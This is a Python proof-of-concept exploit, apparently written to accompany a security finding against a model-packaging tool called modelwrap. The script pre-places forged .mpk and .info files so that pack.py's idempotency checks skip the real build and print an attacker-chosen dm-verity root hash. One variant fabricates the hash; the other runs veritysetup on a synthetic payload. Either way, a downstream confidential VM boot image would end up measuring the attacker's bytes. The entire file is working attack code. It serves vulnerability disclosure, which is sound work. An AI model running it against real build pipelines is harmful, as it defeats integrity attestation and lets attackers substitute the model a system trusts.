#!/usr/bin/env python3
"""
Forge an attacker-chosen `.mpk` / `.info` pair and place them where
modelwrap's `pack.py` will see them.

Two variants:

  - --fake-bytes (default): the `.mpk` is arbitrary bytes (deterministic
    from the model name); `.info` is a hand-crafted
    `ROOTHASH_OFFSET_VERITYUUID` string. The downstream dm-verity layer
    would reject this image at mount time, but modelwrap's idempotency
    check still skips the build and prints the attacker's root hash —
    which is all the prover-side soundness gap requires.

  - --real-verity: build a real-looking data file (a synthetic
    payload), run `veritysetup format` on it, capture the real root
    hash, and emit an `.info` file the downstream consumer would
    actually mount. Needs the `veritysetup` binary on the host.

Either way, the attacker chooses the model identity that the
downstream consumer of `<commit>.info` ends up baking into a CVM
boot image.

Reference: Finding M-1 in modelwrap_soundness_finding.md.
"""

import argparse
import hashlib
import os
import shutil
import subprocess
import sys
import uuid

DEFAULT_MODEL = "meta-llama/Llama-3.2-1B"
DEFAULT_COMMIT = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"


def fake_artifacts(output_dir: str, model_name: str, model_commit: str) -> tuple[str, str, str]:
    """Variant 1: produce arbitrary bytes that satisfy the idempotency
    skip without invoking mkfs.erofs / veritysetup. Returns
    (mpk_path, info_path, root_hash_hex)."""
    out_subdir = os.path.join(output_dir, model_name)
    os.makedirs(out_subdir, exist_ok=True)

    mpk_path = os.path.join(out_subdir, f"{model_commit}.mpk")
    info_path = os.path.join(out_subdir, f"{model_commit}.info")

    # Any bytes will do — the verifier downstream only consults `.info`.
    payload = (b"ATTACKER_CONTROLLED_BYTES_pretending_to_be_an_EROFS_image_for_"
               + model_name.encode() + b"@" + model_commit.encode())
    payload = payload * 1024  # ~70 KB
    with open(mpk_path, "wb") as fh:
        fh.write(payload)

    # Attacker chooses a root hash that the downstream consumer will
    # bake into the CVM measured boot image.
    attacker_root_hash = hashlib.sha256(
        b"attacker-chosen-root-hash-seed:" + model_commit.encode()
    ).hexdigest()
    fake_offset = (len(payload) + 4095) // 4096 * 4096
    fake_uuid = uuid.uuid5(uuid.NAMESPACE_URL, f"attacker-{model_commit}")

    with open(info_path, "w") as fh:
        fh.write(f"{attacker_root_hash}_{fake_offset}_{fake_uuid}")

    return mpk_path, info_path, attacker_root_hash


def real_verity_artifacts(
    output_dir: str, model_name: str, model_commit: str
) -> tuple[str, str, str]:
    """Variant 2: build a real (synthetic) payload, run `veritysetup
    format` on it, and emit a valid `.info` file. Requires
    `veritysetup` on PATH."""
    if shutil.which("veritysetup") is None:
        raise RuntimeError("veritysetup not found on PATH; use --fake-bytes instead")

    out_subdir = os.path.join(output_dir, model_name)
    os.makedirs(out_subdir, exist_ok=True)

    mpk_path = os.path.join(out_subdir, f"{model_commit}.mpk")
    info_path = os.path.join(out_subdir, f"{model_commit}.info")

    # Build a payload large enough for veritysetup to handle.
    payload = (b"ATTACKER_PAYLOAD_" + model_name.encode() + b"@" + model_commit.encode()) * 8192
    payload = payload[: (len(payload) // 4096) * 4096]  # 4k-align
    offset = len(payload)
    payload += b"\x00" * 4096  # space for the hash tree
    with open(mpk_path, "wb") as fh:
        fh.write(payload)

    verity_uuid = str(uuid.uuid5(uuid.NAMESPACE_URL,
                                 f"{model_name}@{model_commit}-inner"))
    salt = hashlib.sha256(f"{model_name}@{model_commit}".encode()).hexdigest()

    veritysetup_cmd = [
        "veritysetup",
        f"--salt={salt}",
        f"--uuid={verity_uuid}",
        f"--hash-offset={offset}",
        f"--root-hash-file={info_path}",
        "format",
        mpk_path,
        mpk_path,
    ]
    print(f"[+] running: {' '.join(veritysetup_cmd)}")
    result = subprocess.run(veritysetup_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(
            f"veritysetup failed:\nstdout: {result.stdout}\nstderr: {result.stderr}"
        )

    with open(info_path, "r") as fh:
        root_hash = fh.read().strip()

    # Append the offset and uuid (matches modelwrap's `.info` schema).
    with open(info_path, "a") as fh:
        fh.write(f"_{offset}_{verity_uuid}")

    return mpk_path, info_path, root_hash


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output-dir", default="./output",
                        help="Output directory modelwrap will see at /output (default: ./output)")
    parser.add_argument("--model", default=DEFAULT_MODEL,
                        help=f"Model name modelwrap will be told to pack (default: {DEFAULT_MODEL})")
    parser.add_argument("--commit", default=DEFAULT_COMMIT,
                        help=f"Commit hash modelwrap will be told (default: {DEFAULT_COMMIT})")
    parser.add_argument("--real-verity", action="store_true",
                        help="Use real veritysetup to compute the root hash (requires veritysetup)")
    args = parser.parse_args()

    builder = real_verity_artifacts if args.real_verity else fake_artifacts
    mpk, info, root_hash = builder(args.output_dir, args.model, args.commit)

    print()
    print(f"[+] Pre-placed evil artifacts for MODEL={args.model}@{args.commit}")
    print(f"        mpk:  {mpk}  ({os.path.getsize(mpk):,} bytes)")
    print(f"        info: {info}")
    with open(info, "r") as fh:
        info_contents = fh.read()
    print(f"        info contents: {info_contents}")
    print(f"        attacker root hash: {root_hash}")
    print()
    print(
        "    When `pack.py` runs with this output dir already populated, its\n"
        "    idempotency checks at pack.py:58 and pack.py:77 will both skip,\n"
        "    and the final `print(f.read())` will emit the .info string above.\n"
        "    A downstream consumer that pins this root hash into a CVM measured\n"
        "    boot image will dm-verity-protect the attacker's bytes."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
